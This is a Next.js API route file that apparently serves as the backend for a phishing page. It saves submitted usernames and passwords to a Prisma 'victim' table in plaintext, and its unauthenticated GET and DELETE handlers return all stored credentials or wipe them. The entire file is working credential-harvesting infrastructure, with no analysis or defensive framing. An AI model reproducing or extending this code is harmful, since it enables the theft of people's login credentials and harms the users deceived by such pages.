import { NextRequest } from "next/server";
import { PrismaClient } from "../generated/prisma";

const prisma = new PrismaClient();

export async function GET() {
  const victims = await prisma.victim.findMany({});

  return Response.json(victims);
}

export async function POST(req: NextRequest) {
  const { username, password } = await req.json();

  if (!username || !password) {
    return Response.json({
      response: false,
      message: "Failed to Send Data...",
    });
  }

  await prisma.victim.create({
    data: {
      username,
      password,
    },
  });

  return Response.json({ response: true, message: "Data Sended Successfully" });
}

export async function DELETE() {
  try {
    await prisma.victim.deleteMany({});
  } catch (e) {
    return Response.json({ response: false, message: "Failed to Delete Data" });
  }
  return Response.json({
    response: true,
    message: "Data Has Been Deleted Successfully",
  });
}
